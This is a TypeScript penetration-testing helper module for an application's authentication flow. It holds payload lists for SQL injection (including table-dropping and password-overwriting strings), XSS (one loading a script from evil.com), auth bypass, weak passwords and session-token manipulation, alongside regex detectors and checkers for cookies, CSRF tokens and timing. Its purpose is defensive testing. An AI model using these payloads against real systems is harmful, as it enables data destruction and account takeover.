/**
 * T135: Authentication Penetration Testing Framework
 *
 * Security testing utilities for conducting penetration tests on authentication flows.
 * This module provides tools for testing common vulnerabilities:
 * - SQL Injection
 * - Brute Force Attacks
 * - Session Hijacking
 * - CSRF Vulnerabilities
 * - XSS Attacks
 * - Authentication Bypass
 * - Password Security
 * - Cookie Security
 *
 * @module pentest
 */

/**
 * SQL Injection test payloads
 * Common SQL injection patterns used by attackers
 */
export const SQL_INJECTION_PAYLOADS = [
  // Basic SQL injection
  "' OR '1'='1",
  "' OR 1=1--",
  "admin'--",
  "' OR 'a'='a",

  // Union-based injection
  "' UNION SELECT NULL--",
  "' UNION SELECT password FROM users--",

  // Boolean-based blind injection
  "' AND 1=1--",
  "' AND 1=2--",

  // Time-based blind injection
  "'; WAITFOR DELAY '00:00:05'--",
  "'; SELECT pg_sleep(5)--",

  // Stacked queries
  "'; DROP TABLE users--",
  "'; UPDATE users SET password='hacked'--",

  // String concatenation
  "admin' || 'x'='adminx",

  // Comment injection
  "admin'/*",
  "admin'#",

  // Error-based injection
  "'",
  "''",
  "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
];

/**
 * XSS (Cross-Site Scripting) test payloads
 */
export const XSS_PAYLOADS = [
  // Basic XSS
  "<script>alert('XSS')</script>",
  "<img src=x onerror=alert('XSS')>",
  "<svg/onload=alert('XSS')>",

  // Event handler XSS
  "<body onload=alert('XSS')>",
  "<input onfocus=alert('XSS') autofocus>",
  "<select onfocus=alert('XSS') autofocus>",

  // JavaScript protocol
  "javascript:alert('XSS')",
  "<a href='javascript:alert(\"XSS\")'>click</a>",

  // Data protocol
  "<object data='data:text/html,<script>alert(\"XSS\")</script>'>",

  // Encoded XSS
  "%3Cscript%3Ealert('XSS')%3C/script%3E",
  "&#60;script&#62;alert('XSS')&#60;/script&#62;",

  // Filter bypass
  "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
  "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
];

/**
 * Authentication bypass payloads
 */
export const AUTH_BYPASS_PAYLOADS = [
  // Empty credentials
  { email: "", password: "" },
  { email: null, password: null },

  // SQL injection in username
  { email: "admin'--", password: "anything" },
  { email: "' OR '1'='1'--", password: "" },

  // Special characters
  { email: "admin\x00", password: "test" },
  { email: "admin%00", password: "test" },

  // Long strings (buffer overflow attempt)
  { email: "A".repeat(10000), password: "test" },
  { email: "test@example.com", password: "A".repeat(10000) },
];

/**
 * Common weak passwords for brute force testing
 */
export const WEAK_PASSWORDS = [
  "password",
  "123456",
  "12345678",
  "qwerty",
  "abc123",
  "password123",
  "admin",
  "letmein",
  "welcome",
  "monkey",
  "1234567890",
  "Password1",
  "P@ssw0rd",
  "admin123",
  "root",
];

/**
 * Session token manipulation patterns
 */
export const SESSION_MANIPULATION_PATTERNS = {
  // Empty/null tokens
  empty: "",
  null: null as any,
  undefined: undefined as any,

  // Invalid tokens
  invalid: "invalid_session_token",
  expired: "expired_token_12345",

  // Token injection
  sqlInjection: "' OR '1'='1",
  xss: "<script>alert('XSS')</script>",

  // Format manipulation
  shortToken: "abc",
  longToken: "A".repeat(10000),
  specialChars: "!@#$%^&*()",

  // Predictable tokens
  sequential: "00000000000000000000000000000001",
  allZeros: "00000000000000000000000000000000",
  allOnes: "11111111111111111111111111111111",
};

/**
 * Test if a string contains SQL injection patterns
 */
export function containsSQLInjection(input: string): boolean {
  const sqlPatterns = [
    /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION)\b)/i,
    /('|"|;|--|\*|\/\*)/,
    /(OR|AND)\s+['"]?\d+['"]?\s*=\s*['"]?\d+['"]?/i,
    /WAITFOR\s+DELAY/i,
    /pg_sleep/i,
    /BENCHMARK/i,
  ];

  return sqlPatterns.some(pattern => pattern.test(input));
}

/**
 * Test if a string contains XSS patterns
 */
export function containsXSS(input: string): boolean {
  const xssPatterns = [
    /<script[\s\S]*?>[\s\S]*?<\/script>/i,
    /<script[\s\S]*?>/i, // Script tag opening
    /<img[\s\S]*?onerror[\s\S]*?>/i,
    /<img[\s\S]*?on\w+[\s\S]*?>/i, // Any img event handler
    /<svg[\s\S]*?onload[\s\S]*?>/i,
    /<svg[\s\S]*?on\w+[\s\S]*?>/i, // Any svg event handler
    /javascript:/i,
    /on\w+\s*=[\s\S]*?/i, // Event handlers
    /<body[\s\S]*?onload/i,
    /<input[\s\S]*?onfocus/i,
    /<select[\s\S]*?onfocus/i,
    /<a[\s\S]*?href[\s\S]*?javascript:/i,
    /<object[\s\S]*?data[\s\S]*?:/i,
    /&#\d+;/i, // HTML entities
    /%3C/i, // Encoded <
    /&lt;script/i, // Entity encoded script
  ];

  return xssPatterns.some(pattern => pattern.test(input));
}

/**
 * Brute force attack simulator
 * Tests rate limiting and account lockout mechanisms
 */
export interface BruteForceResult {
  attemptsMade: number;
  successfulAttempts: number;
  blockedAttempts: number;
  rateLimitTriggered: boolean;
  averageResponseTime: number;
  vulnerabilityDetected: boolean;
  details: string[];
}

/**
 * Test password strength
 */
export interface PasswordStrengthTest {
  password: string;
  length: number;
  hasUppercase: boolean;
  hasLowercase: boolean;
  hasNumbers: boolean;
  hasSpecialChars: boolean;
  isCommon: boolean;
  score: number; // 0-100
  verdict: 'very_weak' | 'weak' | 'medium' | 'strong' | 'very_strong';
}

export function testPasswordStrength(password: string): PasswordStrengthTest {
  const hasUppercase = /[A-Z]/.test(password);
  const hasLowercase = /[a-z]/.test(password);
  const hasNumbers = /\d/.test(password);
  const hasSpecialChars = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password);

  // Check if password is common (exact match or simple variations)
  const lowerPassword = password.toLowerCase();
  const isCommon = WEAK_PASSWORDS.some(weak => {
    const lowerWeak = weak.toLowerCase();
    // Exact match
    if (lowerPassword === lowerWeak) return true;
    // Simple number suffix (password123, admin123, etc.)
    if (lowerPassword === lowerWeak + '123') return true;
    if (lowerPassword === lowerWeak + '1') return true;
    // Contains as primary component (>70% of password)
    if (lowerPassword.length <= 12 && lowerPassword.includes(lowerWeak)) {
      const weakRatio = lowerWeak.length / lowerPassword.length;
      return weakRatio > 0.7;
    }
    return false;
  });

  let score = 0;

  // Length scoring
  if (password.length >= 8) score += 20;
  if (password.length >= 12) score += 10;
  if (password.length >= 16) score += 10;

  // Character variety scoring
  if (hasUppercase) score += 15;
  if (hasLowercase) score += 15;
  if (hasNumbers) score += 15;
  if (hasSpecialChars) score += 15;

  // Penalty for common passwords
  if (isCommon) score -= 70;

  // Ensure score is within 0-100
  score = Math.max(0, Math.min(100, score));

  let verdict: PasswordStrengthTest['verdict'];
  if (score < 20) verdict = 'very_weak';
  else if (score < 40) verdict = 'weak';
  else if (score < 60) verdict = 'medium';
  else if (score < 80) verdict = 'strong';
  else verdict = 'very_strong';

  return {
    password,
    length: password.length,
    hasUppercase,
    hasLowercase,
    hasNumbers,
    hasSpecialChars,
    isCommon,
    score,
    verdict,
  };
}

/**
 * Cookie security test
 */
export interface CookieSecurityTest {
  hasSecureFlag: boolean;
  hasHttpOnlyFlag: boolean;
  hasSameSiteFlag: boolean;
  sameSiteValue: 'strict' | 'lax' | 'none' | null;
  hasExpiration: boolean;
  isSessionCookie: boolean;
  vulnerabilities: string[];
  isSecure: boolean;
}

export function testCookieSecurity(cookie: {
  secure?: boolean;
  httpOnly?: boolean;
  sameSite?: 'strict' | 'lax' | 'none' | boolean;
  maxAge?: number;
  expires?: Date;
}): CookieSecurityTest {
  const vulnerabilities: string[] = [];

  const hasSecureFlag = cookie.secure === true;
  const hasHttpOnlyFlag = cookie.httpOnly === true;
  const hasSameSiteFlag = cookie.sameSite !== undefined && cookie.sameSite !== false;

  let sameSiteValue: CookieSecurityTest['sameSiteValue'] = null;
  if (typeof cookie.sameSite === 'string') {
    sameSiteValue = cookie.sameSite;
  }

  const hasExpiration = !!(cookie.maxAge || cookie.expires);
  const isSessionCookie = !hasExpiration;

  if (!hasSecureFlag) {
    vulnerabilities.push('Missing Secure flag - cookie can be transmitted over HTTP');
  }

  if (!hasHttpOnlyFlag) {
    vulnerabilities.push('Missing HttpOnly flag - cookie accessible via JavaScript (XSS risk)');
  }

  if (!hasSameSiteFlag) {
    vulnerabilities.push('Missing SameSite flag - vulnerable to CSRF attacks');
  } else if (sameSiteValue === 'none') {
    vulnerabilities.push('SameSite=None - allows cross-site requests (CSRF risk)');
  }

  if (isSessionCookie) {
    vulnerabilities.push('Session cookie without expiration - persists indefinitely');
  }

  return {
    hasSecureFlag,
    hasHttpOnlyFlag,
    hasSameSiteFlag,
    sameSiteValue,
    hasExpiration,
    isSessionCookie,
    vulnerabilities,
    isSecure: vulnerabilities.length === 0,
  };
}

/**
 * CSRF token validation test
 */
export interface CSRFTestResult {
  tokenPresent: boolean;
  tokenValid: boolean;
  tokenLength: number;
  tokenRandomness: number; // 0-100 score
  vulnerabilities: string[];
  isSecure: boolean;
}

export function testCSRFToken(token: string | null | undefined): CSRFTestResult {
  const vulnerabilities: string[] = [];
  const tokenPresent = !!token;

  if (!tokenPresent) {
    vulnerabilities.push('No CSRF token present');
    return {
      tokenPresent: false,
      tokenValid: false,
      tokenLength: 0,
      tokenRandomness: 0,
      vulnerabilities,
      isSecure: false,
    };
  }

  const tokenLength = token!.length;

  if (tokenLength < 32) {
    vulnerabilities.push('CSRF token too short - should be at least 32 characters');
  }

  // Test randomness (simple entropy test)
  const uniqueChars = new Set(token!.split('')).size;
  const tokenRandomness = Math.min(100, (uniqueChars / tokenLength) * 100);

  if (tokenRandomness < 50) {
    vulnerabilities.push('CSRF token has low randomness - predictable pattern detected');
  }

  // Check for predictable patterns
  if (/^[0-9]+$/.test(token!)) {
    vulnerabilities.push('CSRF token contains only numbers - low entropy');
  }

  if (/^[a-z]+$/.test(token!)) {
    vulnerabilities.push('CSRF token contains only lowercase letters - low entropy');
  }

  return {
    tokenPresent,
    tokenValid: tokenLength >= 32 && tokenRandomness >= 50,
    tokenLength,
    tokenRandomness,
    vulnerabilities,
    isSecure: vulnerabilities.length === 0,
  };
}

/**
 * Session fixation test
 * Tests if the application is vulnerable to session fixation attacks
 */
export interface SessionFixationTest {
  sessionIdChangesAfterLogin: boolean;
  oldSessionInvalidated: boolean;
  vulnerable: boolean;
  details: string;
}

/**
 * Rate limiting test result
 */
export interface RateLimitTest {
  requestsMade: number;
  requestsAllowed: number;
  requestsBlocked: number;
  rateLimitActive: boolean;
  bypassAttempted: boolean;
  bypassSuccessful: boolean;
  vulnerabilities: string[];
}

/**
 * Generate test payloads for SQL injection testing
 */
export function generateSQLInjectionPayloads(baseEmail: string = "test@example.com"): Array<{
  email: string;
  password: string;
  description: string;
}> {
  return SQL_INJECTION_PAYLOADS.map((payload, index) => ({
    email: `${payload}@example.com`,
    password: "test123",
    description: `SQL Injection attempt ${index + 1}: ${payload}`,
  }));
}

/**
 * Generate test payloads for XSS testing
 */
export function generateXSSPayloads(): Array<{
  value: string;
  location: 'email' | 'password' | 'name';
  description: string;
}> {
  return XSS_PAYLOADS.flatMap((payload, index) => [
    {
      value: payload,
      location: 'email' as const,
      description: `XSS in email field: ${payload.substring(0, 50)}`,
    },
    {
      value: payload,
      location: 'name' as const,
      description: `XSS in name field: ${payload.substring(0, 50)}`,
    },
  ]);
}

/**
 * Timing attack detector
 * Detects if timing differences can be used to infer information
 */
export interface TimingAttackResult {
  averageValidUserTime: number;
  averageInvalidUserTime: number;
  timeDifference: number;
  significantDifference: boolean;
  vulnerable: boolean;
  details: string;
}

export function analyzeTimingAttack(
  validUserTimes: number[],
  invalidUserTimes: number[]
): TimingAttackResult {
  const avgValid = validUserTimes.reduce((a, b) => a + b, 0) / validUserTimes.length;
  const avgInvalid = invalidUserTimes.reduce((a, b) => a + b, 0) / invalidUserTimes.length;

  const timeDifference = Math.abs(avgValid - avgInvalid);
  const significantDifference = timeDifference > 100; // > 100ms difference

  const vulnerable = significantDifference;

  let details = '';
  if (vulnerable) {
    details = `Timing difference of ${timeDifference.toFixed(2)}ms detected. `;
    details += 'Attackers can use timing differences to enumerate valid usernames.';
  } else {
    details = `Timing difference of ${timeDifference.toFixed(2)}ms is acceptable.`;
  }

  return {
    averageValidUserTime: avgValid,
    averageInvalidUserTime: avgInvalid,
    timeDifference,
    significantDifference,
    vulnerable,
    details,
  };
}

/**
 * Generate report for penetration testing results
 */
export interface PentestReport {
  testDate: string;
  testDuration: number;
  totalTests: number;
  passedTests: number;
  failedTests: number;
  criticalIssues: number;
  highIssues: number;
  mediumIssues: number;
  lowIssues: number;
  vulnerabilities: Array<{
    severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
    category: string;
    description: string;
    recommendation: string;
  }>;
  summary: string;
}

/**
 * Create a comprehensive penetration testing report
 */
export function generatePentestReport(
  vulnerabilities: PentestReport['vulnerabilities'],
  startTime: number
): PentestReport {
  const testDuration = Date.now() - startTime;
  const totalTests = vulnerabilities.length;
  const failedTests = vulnerabilities.filter(v =>
    v.severity === 'critical' || v.severity === 'high'
  ).length;
  const passedTests = totalTests - failedTests;

  const criticalIssues = vulnerabilities.filter(v => v.severity === 'critical').length;
  const highIssues = vulnerabilities.filter(v => v.severity === 'high').length;
  const mediumIssues = vulnerabilities.filter(v => v.severity === 'medium').length;
  const lowIssues = vulnerabilities.filter(v => v.severity === 'low').length;

  let summary = '';
  if (criticalIssues > 0) {
    summary = `CRITICAL: Found ${criticalIssues} critical vulnerabilities requiring immediate attention.`;
  } else if (highIssues > 0) {
    summary = `HIGH RISK: Found ${highIssues} high-severity vulnerabilities.`;
  } else if (mediumIssues > 0) {
    summary = `MEDIUM RISK: Found ${mediumIssues} medium-severity issues to address.`;
  } else if (lowIssues > 0) {
    summary = `LOW RISK: Found ${lowIssues} low-severity issues for improvement.`;
  } else {
    summary = 'PASSED: No critical vulnerabilities detected.';
  }

  return {
    testDate: new Date().toISOString(),
    testDuration,
    totalTests,
    passedTests,
    failedTests,
    criticalIssues,
    highIssues,
    mediumIssues,
    lowIssues,
    vulnerabilities,
    summary,
  };
}
